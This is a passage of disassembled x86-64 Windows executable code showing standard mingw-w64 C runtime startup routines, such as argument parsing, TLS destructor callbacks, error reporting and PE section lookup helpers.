   140004674:	48 8d 0d 94 2a 07 00 	lea    0x72a94(%rip),%rcx        # 14007710f <.refptr.__CTOR_LIST__+0x22f>
   14000467b:	48 89 f2             	mov    %rsi,%rdx
   14000467e:	e8 3d 00 00 00       	call   1400046c0 <__report_error>
   140004683:	41 8b 56 08          	mov    0x8(%r14),%edx
   140004687:	48 8b 05 72 5f 07 00 	mov    0x75f72(%rip),%rax        # 14007a600 <the_secs>
   14000468e:	4b 8d 0c bf          	lea    (%r15,%r15,4),%rcx
   140004692:	4c 8b 44 c8 18       	mov    0x18(%rax,%rcx,8),%r8
   140004697:	48 8d 0d 91 2a 07 00 	lea    0x72a91(%rip),%rcx        # 14007712f <.refptr.__CTOR_LIST__+0x24f>
   14000469e:	e8 1d 00 00 00       	call   1400046c0 <__report_error>
   1400046a3:	ff 15 37 33 07 00    	call   *0x73337(%rip)        # 1400779e0 <__imp_GetLastError>
   1400046a9:	48 8d 0d b0 2a 07 00 	lea    0x72ab0(%rip),%rcx        # 140077160 <.refptr.__CTOR_LIST__+0x280>
   1400046b0:	89 c2                	mov    %eax,%edx
   1400046b2:	e8 09 00 00 00       	call   1400046c0 <__report_error>
   1400046b7:	cc                   	int3
   1400046b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400046bf:	00 

00000001400046c0 <__report_error>:
   1400046c0:	56                   	push   %rsi
   1400046c1:	48 83 ec 30          	sub    $0x30,%rsp
   1400046c5:	48 89 ce             	mov    %rcx,%rsi
   1400046c8:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   1400046cd:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   1400046d2:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   1400046d7:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400046dc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400046e1:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400046e6:	e8 15 0f 00 00       	call   140005600 <__acrt_iob_func>
   1400046eb:	48 8d 15 95 2a 07 00 	lea    0x72a95(%rip),%rdx        # 140077187 <.refptr.__CTOR_LIST__+0x2a7>
   1400046f2:	48 89 c1             	mov    %rax,%rcx
   1400046f5:	e8 76 04 00 00       	call   140004b70 <fprintf>
   1400046fa:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400046ff:	e8 fc 0e 00 00       	call   140005600 <__acrt_iob_func>
   140004704:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140004709:	48 89 c1             	mov    %rax,%rcx
   14000470c:	48 89 f2             	mov    %rsi,%rdx
   14000470f:	e8 3c 08 00 00       	call   140004f50 <vfprintf>
   140004714:	e8 17 0f 00 00       	call   140005630 <abort>
   140004719:	cc                   	int3
   14000471a:	cc                   	int3
   14000471b:	cc                   	int3
   14000471c:	cc                   	int3
   14000471d:	cc                   	int3
   14000471e:	cc                   	int3
   14000471f:	cc                   	int3

0000000140004720 <_wsetargv>:
   140004720:	31 c0                	xor    %eax,%eax
   140004722:	c3                   	ret
   140004723:	cc                   	int3
   140004724:	cc                   	int3
   140004725:	cc                   	int3
   140004726:	cc                   	int3
   140004727:	cc                   	int3
   140004728:	cc                   	int3
   140004729:	cc                   	int3
   14000472a:	cc                   	int3
   14000472b:	cc                   	int3
   14000472c:	cc                   	int3
   14000472d:	cc                   	int3
   14000472e:	cc                   	int3
   14000472f:	cc                   	int3

0000000140004730 <wmain>:
   140004730:	56                   	push   %rsi
   140004731:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140004738:	e8 03 0f 00 00       	call   140005640 <__p__wcmdln>
   14000473d:	48 8b 30             	mov    (%rax),%rsi
   140004740:	48 85 f6             	test   %rsi,%rsi
   140004743:	74 4d                	je     140004792 <wmain+0x62>
   140004745:	48 83 c6 fe          	add    $0xfffffffffffffffe,%rsi
   140004749:	31 c0                	xor    %eax,%eax
   14000474b:	eb 12                	jmp    14000475f <wmain+0x2f>
   14000474d:	0f 1f 00             	nopl   (%rax)
   140004750:	31 d2                	xor    %edx,%edx
   140004752:	66 83 f9 22          	cmp    $0x22,%cx
   140004756:	0f 94 c2             	sete   %dl
   140004759:	31 d0                	xor    %edx,%eax
   14000475b:	48 83 c6 02          	add    $0x2,%rsi
   14000475f:	0f b7 4e 02          	movzwl 0x2(%rsi),%ecx
   140004763:	66 83 f9 20          	cmp    $0x20,%cx
   140004767:	77 e7                	ja     140004750 <wmain+0x20>
   140004769:	66 85 c9             	test   %cx,%cx
   14000476c:	74 12                	je     140004780 <wmain+0x50>
   14000476e:	85 c0                	test   %eax,%eax
   140004770:	75 de                	jne    140004750 <wmain+0x20>
   140004772:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004779:	1f 84 00 00 00 00 00 
   140004780:	0f b7 46 02          	movzwl 0x2(%rsi),%eax
   140004784:	48 83 c6 02          	add    $0x2,%rsi
   140004788:	ff c8                	dec    %eax
   14000478a:	66 83 f8 20          	cmp    $0x20,%ax
   14000478e:	72 f0                	jb     140004780 <wmain+0x50>
   140004790:	eb 07                	jmp    140004799 <wmain+0x69>
   140004792:	48 8d 35 5f 2a 07 00 	lea    0x72a5f(%rip),%rsi        # 1400771f8 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__+0x8>
   140004799:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000479e:	ff 15 5c 32 07 00    	call   *0x7325c(%rip)        # 140077a00 <__imp_GetStartupInfoW>
   1400047a4:	f6 44 24 64 01       	testb  $0x1,0x64(%rsp)
   1400047a9:	0f b7 44 24 68       	movzwl 0x68(%rsp),%eax
   1400047ae:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   1400047b4:	44 0f 45 c8          	cmovne %eax,%r9d
   1400047b8:	48 8b 0d 49 18 00 00 	mov    0x1849(%rip),%rcx        # 140006008 <.refptr.__ImageBase>
   1400047bf:	31 d2                	xor    %edx,%edx
   1400047c1:	49 89 f0             	mov    %rsi,%r8
   1400047c4:	e8 17 cc ff ff       	call   1400013e0 <wWinMain>
   1400047c9:	90                   	nop
   1400047ca:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400047d1:	5e                   	pop    %rsi
   1400047d2:	c3                   	ret
   1400047d3:	cc                   	int3

00000001400047d4 <___chkstk_ms>:
   1400047d4:	51                   	push   %rcx
   1400047d5:	50                   	push   %rax
   1400047d6:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   1400047dc:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   1400047e1:	72 18                	jb     1400047fb <___chkstk_ms+0x27>
   1400047e3:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   1400047ea:	48 85 09             	test   %rcx,(%rcx)
   1400047ed:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   1400047f3:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   1400047f9:	77 e8                	ja     1400047e3 <___chkstk_ms+0xf>
   1400047fb:	48 29 c1             	sub    %rax,%rcx
   1400047fe:	48 85 09             	test   %rcx,(%rcx)
   140004801:	58                   	pop    %rax
   140004802:	59                   	pop    %rcx
   140004803:	c3                   	ret
   140004804:	cc                   	int3
   140004805:	cc                   	int3
   140004806:	cc                   	int3
   140004807:	cc                   	int3
   140004808:	cc                   	int3
   140004809:	cc                   	int3
   14000480a:	cc                   	int3
   14000480b:	cc                   	int3
   14000480c:	cc                   	int3
   14000480d:	cc                   	int3
   14000480e:	cc                   	int3
   14000480f:	cc                   	int3

0000000140004810 <__guard_check_icall_dummy>:
   140004810:	c3                   	ret
   140004811:	cc                   	int3
   140004812:	cc                   	int3
   140004813:	cc                   	int3
   140004814:	cc                   	int3
   140004815:	cc                   	int3
   140004816:	cc                   	int3
   140004817:	cc                   	int3
   140004818:	cc                   	int3
   140004819:	cc                   	int3
   14000481a:	cc                   	int3
   14000481b:	cc                   	int3
   14000481c:	cc                   	int3
   14000481d:	cc                   	int3
   14000481e:	cc                   	int3
   14000481f:	cc                   	int3

0000000140004820 <__p___winitenv>:
   140004820:	48 8b 05 d9 29 07 00 	mov    0x729d9(%rip),%rax        # 140077200 <.refptr.__imp___winitenv>
   140004827:	48 8b 00             	mov    (%rax),%rax
   14000482a:	c3                   	ret
   14000482b:	cc                   	int3
   14000482c:	cc                   	int3
   14000482d:	cc                   	int3
   14000482e:	cc                   	int3
   14000482f:	cc                   	int3

0000000140004830 <__wgetmainargs>:
   140004830:	41 57                	push   %r15
   140004832:	41 56                	push   %r14
   140004834:	56                   	push   %rsi
   140004835:	57                   	push   %rdi
   140004836:	53                   	push   %rbx
   140004837:	48 83 ec 20          	sub    $0x20,%rsp
   14000483b:	44 89 cf             	mov    %r9d,%edi
   14000483e:	4c 89 c6             	mov    %r8,%rsi
   140004841:	48 89 d3             	mov    %rdx,%rbx
   140004844:	49 89 ce             	mov    %rcx,%r14
   140004847:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   14000484c:	e8 1f 0e 00 00       	call   140005670 <_initialize_wide_environment>
   140004851:	83 ff 01             	cmp    $0x1,%edi
   140004854:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004859:	83 d9 00             	sbb    $0x0,%ecx
   14000485c:	e8 1f 0e 00 00       	call   140005680 <_configure_wide_argv>
   140004861:	e8 2a 0e 00 00       	call   140005690 <__p___argc>
   140004866:	8b 00                	mov    (%rax),%eax
   140004868:	41 89 06             	mov    %eax,(%r14)
   14000486b:	e8 30 0e 00 00       	call   1400056a0 <__p___wargv>
   140004870:	48 8b 00             	mov    (%rax),%rax
   140004873:	48 89 03             	mov    %rax,(%rbx)
   140004876:	e8 35 0e 00 00       	call   1400056b0 <__p__wenviron>
   14000487b:	48 8b 00             	mov    (%rax),%rax
   14000487e:	48 89 06             	mov    %rax,(%rsi)
   140004881:	41 8b 0f             	mov    (%r15),%ecx
   140004884:	e8 37 0e 00 00       	call   1400056c0 <_set_new_mode>
   140004889:	31 c0                	xor    %eax,%eax
   14000488b:	48 83 c4 20          	add    $0x20,%rsp
   14000488f:	5b                   	pop    %rbx
   140004890:	5f                   	pop    %rdi
   140004891:	5e                   	pop    %rsi
   140004892:	41 5e                	pop    %r14
   140004894:	41 5f                	pop    %r15
   140004896:	c3                   	ret
   140004897:	cc                   	int3
   140004898:	cc                   	int3
   140004899:	cc                   	int3
   14000489a:	cc                   	int3
   14000489b:	cc                   	int3
   14000489c:	cc                   	int3
   14000489d:	cc                   	int3
   14000489e:	cc                   	int3
   14000489f:	cc                   	int3

00000001400048a0 <_amsg_exit>:
   1400048a0:	56                   	push   %rsi
   1400048a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400048a5:	89 ce                	mov    %ecx,%esi
   1400048a7:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400048ac:	e8 4f 0d 00 00       	call   140005600 <__acrt_iob_func>
   1400048b1:	48 8d 15 50 29 07 00 	lea    0x72950(%rip),%rdx        # 140077208 <.refptr.__imp___winitenv+0x8>
   1400048b8:	48 89 c1             	mov    %rax,%rcx
   1400048bb:	41 89 f0             	mov    %esi,%r8d
   1400048be:	e8 ad 02 00 00       	call   140004b70 <fprintf>
   1400048c3:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400048c8:	e8 03 0e 00 00       	call   1400056d0 <_exit>
   1400048cd:	cc                   	int3
   1400048ce:	cc                   	int3
   1400048cf:	cc                   	int3

00000001400048d0 <___w64_mingwthr_add_key_dtor>:
   1400048d0:	56                   	push   %rsi
   1400048d1:	57                   	push   %rdi
   1400048d2:	53                   	push   %rbx
   1400048d3:	48 83 ec 20          	sub    $0x20,%rsp
   1400048d7:	31 f6                	xor    %esi,%esi
   1400048d9:	83 3d 30 5d 07 00 00 	cmpl   $0x0,0x75d30(%rip)        # 14007a610 <__mingwthr_cs_init>
   1400048e0:	74 54                	je     140004936 <___w64_mingwthr_add_key_dtor+0x66>
   1400048e2:	48 89 d7             	mov    %rdx,%rdi
   1400048e5:	89 cb                	mov    %ecx,%ebx
   1400048e7:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400048ec:	ba 18 00 00 00       	mov    $0x18,%edx
   1400048f1:	e8 ea 0d 00 00       	call   1400056e0 <calloc>
   1400048f6:	48 85 c0             	test   %rax,%rax
   1400048f9:	74 36                	je     140004931 <___w64_mingwthr_add_key_dtor+0x61>
   1400048fb:	89 18                	mov    %ebx,(%rax)
   1400048fd:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140004901:	48 8d 3d 10 5d 07 00 	lea    0x75d10(%rip),%rdi        # 14007a618 <__mingwthr_cs>
   140004908:	48 89 f9             	mov    %rdi,%rcx
   14000490b:	48 89 c3             	mov    %rax,%rbx
   14000490e:	ff 15 9c 30 07 00    	call   *0x7309c(%rip)        # 1400779b0 <__imp_EnterCriticalSection>
   140004914:	48 8b 05 25 5d 07 00 	mov    0x75d25(%rip),%rax        # 14007a640 <key_dtor_list>
   14000491b:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000491f:	48 89 1d 1a 5d 07 00 	mov    %rbx,0x75d1a(%rip)        # 14007a640 <key_dtor_list>
   140004926:	48 89 f9             	mov    %rdi,%rcx
   140004929:	ff 15 09 31 07 00    	call   *0x73109(%rip)        # 140077a38 <__imp_LeaveCriticalSection>
   14000492f:	eb 05                	jmp    140004936 <___w64_mingwthr_add_key_dtor+0x66>
   140004931:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140004936:	89 f0                	mov    %esi,%eax
   140004938:	48 83 c4 20          	add    $0x20,%rsp
   14000493c:	5b                   	pop    %rbx
   14000493d:	5f                   	pop    %rdi
   14000493e:	5e                   	pop    %rsi
   14000493f:	c3                   	ret

0000000140004940 <___w64_mingwthr_remove_key_dtor>:
   140004940:	56                   	push   %rsi
   140004941:	48 83 ec 20          	sub    $0x20,%rsp
   140004945:	83 3d c4 5c 07 00 00 	cmpl   $0x0,0x75cc4(%rip)        # 14007a610 <__mingwthr_cs_init>
   14000494c:	74 71                	je     1400049bf <___w64_mingwthr_remove_key_dtor+0x7f>
   14000494e:	89 ce                	mov    %ecx,%esi
   140004950:	48 8d 0d c1 5c 07 00 	lea    0x75cc1(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004957:	ff 15 53 30 07 00    	call   *0x73053(%rip)        # 1400779b0 <__imp_EnterCriticalSection>
   14000495d:	48 8b 0d dc 5c 07 00 	mov    0x75cdc(%rip),%rcx        # 14007a640 <key_dtor_list>
   140004964:	48 85 c9             	test   %rcx,%rcx
   140004967:	74 49                	je     1400049b2 <___w64_mingwthr_remove_key_dtor+0x72>
   140004969:	8b 01                	mov    (%rcx),%eax
   14000496b:	39 f0                	cmp    %esi,%eax
   14000496d:	75 04                	jne    140004973 <___w64_mingwthr_remove_key_dtor+0x33>
   14000496f:	31 c0                	xor    %eax,%eax
   140004971:	eb 24                	jmp    140004997 <___w64_mingwthr_remove_key_dtor+0x57>
   140004973:	48 89 ca             	mov    %rcx,%rdx
   140004976:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000497d:	00 00 00 
   140004980:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140004984:	48 85 c9             	test   %rcx,%rcx
   140004987:	74 29                	je     1400049b2 <___w64_mingwthr_remove_key_dtor+0x72>
   140004989:	44 8b 01             	mov    (%rcx),%r8d
   14000498c:	48 89 d0             	mov    %rdx,%rax
   14000498f:	48 89 ca             	mov    %rcx,%rdx
   140004992:	41 39 f0             	cmp    %esi,%r8d
   140004995:	75 e9                	jne    140004980 <___w64_mingwthr_remove_key_dtor+0x40>
   140004997:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   14000499b:	48 85 c0             	test   %rax,%rax
   14000499e:	74 06                	je     1400049a6 <___w64_mingwthr_remove_key_dtor+0x66>
   1400049a0:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400049a4:	eb 07                	jmp    1400049ad <___w64_mingwthr_remove_key_dtor+0x6d>
   1400049a6:	48 89 15 93 5c 07 00 	mov    %rdx,0x75c93(%rip)        # 14007a640 <key_dtor_list>
   1400049ad:	e8 5e 0d 00 00       	call   140005710 <free>
   1400049b2:	48 8d 0d 5f 5c 07 00 	lea    0x75c5f(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   1400049b9:	ff 15 79 30 07 00    	call   *0x73079(%rip)        # 140077a38 <__imp_LeaveCriticalSection>
   1400049bf:	31 c0                	xor    %eax,%eax
   1400049c1:	48 83 c4 20          	add    $0x20,%rsp
   1400049c5:	5e                   	pop    %rsi
   1400049c6:	c3                   	ret
   1400049c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400049ce:	00 00 

00000001400049d0 <__mingw_TLScallback>:
   1400049d0:	41 56                	push   %r14
   1400049d2:	56                   	push   %rsi
   1400049d3:	57                   	push   %rdi
   1400049d4:	53                   	push   %rbx
   1400049d5:	48 83 ec 28          	sub    $0x28,%rsp
   1400049d9:	83 fa 03             	cmp    $0x3,%edx
   1400049dc:	0f 87 71 01 00 00    	ja     140004b53 <__mingw_TLScallback+0x183>
   1400049e2:	89 d0                	mov    %edx,%eax
   1400049e4:	48 8d 0d 31 28 07 00 	lea    0x72831(%rip),%rcx        # 14007721c <.refptr.__imp___winitenv+0x1c>
   1400049eb:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   1400049ef:	48 01 c8             	add    %rcx,%rax
   1400049f2:	ff e0                	jmp    *%rax
   1400049f4:	83 3d 15 5c 07 00 00 	cmpl   $0x0,0x75c15(%rip)        # 14007a610 <__mingwthr_cs_init>
   1400049fb:	0f 84 08 01 00 00    	je     140004b09 <__mingw_TLScallback+0x139>
   140004a01:	48 8d 0d 10 5c 07 00 	lea    0x75c10(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004a08:	ff 15 a2 2f 07 00    	call   *0x72fa2(%rip)        # 1400779b0 <__imp_EnterCriticalSection>
   140004a0e:	48 8b 3d 2b 5c 07 00 	mov    0x75c2b(%rip),%rdi        # 14007a640 <key_dtor_list>
   140004a15:	48 85 ff             	test   %rdi,%rdi
   140004a18:	0f 84 de 00 00 00    	je     140004afc <__mingw_TLScallback+0x12c>
   140004a1e:	48 8b 1d 3b 30 07 00 	mov    0x7303b(%rip),%rbx        # 140077a60 <__imp_TlsGetValue>
   140004a25:	4c 8b 35 b4 2f 07 00 	mov    0x72fb4(%rip),%r14        # 1400779e0 <__imp_GetLastError>
   140004a2c:	eb 0f                	jmp    140004a3d <__mingw_TLScallback+0x6d>
   140004a2e:	66 90                	xchg   %ax,%ax
   140004a30:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   140004a34:	48 85 ff             	test   %rdi,%rdi
   140004a37:	0f 84 bf 00 00 00    	je     140004afc <__mingw_TLScallback+0x12c>
   140004a3d:	8b 0f                	mov    (%rdi),%ecx
   140004a3f:	ff d3                	call   *%rbx
   140004a41:	48 89 c6             	mov    %rax,%rsi
   140004a44:	41 ff d6             	call   *%r14
   140004a47:	85 c0                	test   %eax,%eax
   140004a49:	75 e5                	jne    140004a30 <__mingw_TLScallback+0x60>
   140004a4b:	48 85 f6             	test   %rsi,%rsi
   140004a4e:	74 e0                	je     140004a30 <__mingw_TLScallback+0x60>
   140004a50:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004a54:	48 89 f1             	mov    %rsi,%rcx
   140004a57:	ff 15 13 29 07 00    	call   *0x72913(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140004a5d:	eb d1                	jmp    140004a30 <__mingw_TLScallback+0x60>
   140004a5f:	e8 2c f7 ff ff       	call   140004190 <_fpreset>
   140004a64:	e9 ea 00 00 00       	jmp    140004b53 <__mingw_TLScallback+0x183>
   140004a69:	83 3d a0 5b 07 00 00 	cmpl   $0x0,0x75ba0(%rip)        # 14007a610 <__mingwthr_cs_init>
   140004a70:	0f 84 dd 00 00 00    	je     140004b53 <__mingw_TLScallback+0x183>
   140004a76:	48 8d 0d 9b 5b 07 00 	lea    0x75b9b(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004a7d:	ff 15 2d 2f 07 00    	call   *0x72f2d(%rip)        # 1400779b0 <__imp_EnterCriticalSection>
   140004a83:	48 8b 3d b6 5b 07 00 	mov    0x75bb6(%rip),%rdi        # 14007a640 <key_dtor_list>
   140004a8a:	48 85 ff             	test   %rdi,%rdi
   140004a8d:	74 5e                	je     140004aed <__mingw_TLScallback+0x11d>
   140004a8f:	48 8b 1d ca 2f 07 00 	mov    0x72fca(%rip),%rbx        # 140077a60 <__imp_TlsGetValue>
   140004a96:	4c 8b 35 43 2f 07 00 	mov    0x72f43(%rip),%r14        # 1400779e0 <__imp_GetLastError>
   140004a9d:	eb 0a                	jmp    140004aa9 <__mingw_TLScallback+0xd9>
   140004a9f:	90                   	nop
   140004aa0:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   140004aa4:	48 85 ff             	test   %rdi,%rdi
   140004aa7:	74 44                	je     140004aed <__mingw_TLScallback+0x11d>
   140004aa9:	8b 0f                	mov    (%rdi),%ecx
   140004aab:	ff d3                	call   *%rbx
   140004aad:	48 89 c6             	mov    %rax,%rsi
   140004ab0:	41 ff d6             	call   *%r14
   140004ab3:	85 c0                	test   %eax,%eax
   140004ab5:	75 e9                	jne    140004aa0 <__mingw_TLScallback+0xd0>
   140004ab7:	48 85 f6             	test   %rsi,%rsi
   140004aba:	74 e4                	je     140004aa0 <__mingw_TLScallback+0xd0>
   140004abc:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004ac0:	48 89 f1             	mov    %rsi,%rcx
   140004ac3:	ff 15 a7 28 07 00    	call   *0x728a7(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140004ac9:	eb d5                	jmp    140004aa0 <__mingw_TLScallback+0xd0>
   140004acb:	83 3d 3e 5b 07 00 00 	cmpl   $0x0,0x75b3e(%rip)        # 14007a610 <__mingwthr_cs_init>
   140004ad2:	75 0d                	jne    140004ae1 <__mingw_TLScallback+0x111>
   140004ad4:	48 8d 0d 3d 5b 07 00 	lea    0x75b3d(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004adb:	ff 15 4f 2f 07 00    	call   *0x72f4f(%rip)        # 140077a30 <__imp_InitializeCriticalSection>
   140004ae1:	c7 05 25 5b 07 00 01 	movl   $0x1,0x75b25(%rip)        # 14007a610 <__mingwthr_cs_init>
   140004ae8:	00 00 00 
   140004aeb:	eb 66                	jmp    140004b53 <__mingw_TLScallback+0x183>
   140004aed:	48 8d 0d 24 5b 07 00 	lea    0x75b24(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004af4:	ff 15 3e 2f 07 00    	call   *0x72f3e(%rip)        # 140077a38 <__imp_LeaveCriticalSection>
   140004afa:	eb 57                	jmp    140004b53 <__mingw_TLScallback+0x183>
   140004afc:	48 8d 0d 15 5b 07 00 	lea    0x75b15(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004b03:	ff 15 2f 2f 07 00    	call   *0x72f2f(%rip)        # 140077a38 <__imp_LeaveCriticalSection>
   140004b09:	8b 05 01 5b 07 00    	mov    0x75b01(%rip),%eax        # 14007a610 <__mingwthr_cs_init>
   140004b0f:	83 f8 01             	cmp    $0x1,%eax
   140004b12:	75 3f                	jne    140004b53 <__mingw_TLScallback+0x183>
   140004b14:	48 8b 0d 25 5b 07 00 	mov    0x75b25(%rip),%rcx        # 14007a640 <key_dtor_list>
   140004b1b:	48 85 c9             	test   %rcx,%rcx
   140004b1e:	74 11                	je     140004b31 <__mingw_TLScallback+0x161>
   140004b20:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140004b24:	e8 e7 0b 00 00       	call   140005710 <free>
   140004b29:	48 89 f1             	mov    %rsi,%rcx
   140004b2c:	48 85 f6             	test   %rsi,%rsi
   140004b2f:	75 ef                	jne    140004b20 <__mingw_TLScallback+0x150>
   140004b31:	48 c7 05 04 5b 07 00 	movq   $0x0,0x75b04(%rip)        # 14007a640 <key_dtor_list>
   140004b38:	00 00 00 00 
   140004b3c:	c7 05 ca 5a 07 00 00 	movl   $0x0,0x75aca(%rip)        # 14007a610 <__mingwthr_cs_init>
   140004b43:	00 00 00 
   140004b46:	48 8d 0d cb 5a 07 00 	lea    0x75acb(%rip),%rcx        # 14007a618 <__mingwthr_cs>
   140004b4d:	ff 15 4d 2e 07 00    	call   *0x72e4d(%rip)        # 1400779a0 <__imp_DeleteCriticalSection>
   140004b53:	b8 01 00 00 00       	mov    $0x1,%eax
   140004b58:	48 83 c4 28          	add    $0x28,%rsp
   140004b5c:	5b                   	pop    %rbx
   140004b5d:	5f                   	pop    %rdi
   140004b5e:	5e                   	pop    %rsi
   140004b5f:	41 5e                	pop    %r14
   140004b61:	c3                   	ret
   140004b62:	cc                   	int3
   140004b63:	cc                   	int3
   140004b64:	cc                   	int3
   140004b65:	cc                   	int3
   140004b66:	cc                   	int3
   140004b67:	cc                   	int3
   140004b68:	cc                   	int3
   140004b69:	cc                   	int3
   140004b6a:	cc                   	int3
   140004b6b:	cc                   	int3
   140004b6c:	cc                   	int3
   140004b6d:	cc                   	int3
   140004b6e:	cc                   	int3
   140004b6f:	cc                   	int3

0000000140004b70 <fprintf>:
   140004b70:	56                   	push   %rsi
   140004b71:	57                   	push   %rdi
   140004b72:	48 83 ec 38          	sub    $0x38,%rsp
   140004b76:	48 89 d6             	mov    %rdx,%rsi
   140004b79:	48 89 cf             	mov    %rcx,%rdi
   140004b7c:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140004b81:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140004b86:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140004b8b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004b90:	e8 0b 04 00 00       	call   140004fa0 <__local_stdio_printf_options>
   140004b95:	48 8b 08             	mov    (%rax),%rcx
   140004b98:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140004b9d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004ba2:	48 89 fa             	mov    %rdi,%rdx
   140004ba5:	49 89 f0             	mov    %rsi,%r8
   140004ba8:	45 31 c9             	xor    %r9d,%r9d
   140004bab:	e8 a0 0b 00 00       	call   140005750 <__stdio_common_vfprintf>
   140004bb0:	90                   	nop
   140004bb1:	48 83 c4 38          	add    $0x38,%rsp
   140004bb5:	5f                   	pop    %rdi
   140004bb6:	5e                   	pop    %rsi
   140004bb7:	c3                   	ret
   140004bb8:	cc                   	int3
   140004bb9:	cc                   	int3
   140004bba:	cc                   	int3
   140004bbb:	cc                   	int3
   140004bbc:	cc                   	int3
   140004bbd:	cc                   	int3
   140004bbe:	cc                   	int3
   140004bbf:	cc                   	int3

0000000140004bc0 <_ValidateImageBase>:
   140004bc0:	31 c0                	xor    %eax,%eax
   140004bc2:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140004bc7:	75 19                	jne    140004be2 <_ValidateImageBase+0x22>
   140004bc9:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140004bcd:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   140004bd4:	75 0c                	jne    140004be2 <_ValidateImageBase+0x22>
   140004bd6:	31 c0                	xor    %eax,%eax
   140004bd8:	66 81 7c 11 18 0b 02 	cmpw   $0x20b,0x18(%rcx,%rdx,1)
   140004bdf:	0f 94 c0             	sete   %al
   140004be2:	c3                   	ret
   140004be3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004bea:	84 00 00 00 00 00 

0000000140004bf0 <_FindPESection>:
   140004bf0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140004bf4:	44 0f b7 44 01 06    	movzwl 0x6(%rcx,%rax,1),%r8d
   140004bfa:	45 85 c0             	test   %r8d,%r8d
   140004bfd:	74 2b                	je     140004c2a <_FindPESection+0x3a>
   140004bff:	48 01 c1             	add    %rax,%rcx
   140004c02:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140004c06:	48 01 c8             	add    %rcx,%rax
   140004c09:	48 83 c0 18          	add    $0x18,%rax
   140004c0d:	eb 0a                	jmp    140004c19 <_FindPESection+0x29>
   140004c0f:	90                   	nop
   140004c10:	48 83 c0 28          	add    $0x28,%rax
   140004c14:	41 ff c8             	dec    %r8d
   140004c17:	74 11                	je     140004c2a <_FindPESection+0x3a>
   140004c19:	8b 48 0c             	mov    0xc(%rax),%ecx
   140004c1c:	48 39 ca             	cmp    %rcx,%rdx
   140004c1f:	72 ef                	jb     140004c10 <_FindPESection+0x20>
   140004c21:	03 48 08             	add    0x8(%rax),%ecx
   140004c24:	48 39 ca             	cmp    %rcx,%rdx
   140004c27:	73 e7                	jae    140004c10 <_FindPESection+0x20>
   140004c29:	c3                   	ret
   140004c2a:	31 c0                	xor    %eax,%eax
   140004c2c:	c3                   	ret
   140004c2d:	0f 1f 00             	nopl   (%rax)

0000000140004c30 <_FindPESectionByName>:
   140004c30:	56                   	push   %rsi
   140004c31:	57                   	push   %rdi
   140004c32:	55                   	push   %rbp
   140004c33:	53                   	push   %rbx
   140004c34:	48 83 ec 28          	sub    $0x28,%rsp
   140004c38:	48 89 ce             	mov    %rcx,%rsi
   140004c3b:	e8 20 0b 00 00       	call   140005760 <strlen>
   140004c40:	31 ff                	xor    %edi,%edi
   140004c42:	48 83 f8 08          	cmp    $0x8,%rax
   140004c46:	77 6d                	ja     140004cb5 <_FindPESectionByName+0x85>
   140004c48:	48 8b 1d b9 13 00 00 	mov    0x13b9(%rip),%rbx        # 140006008 <.refptr.__ImageBase>
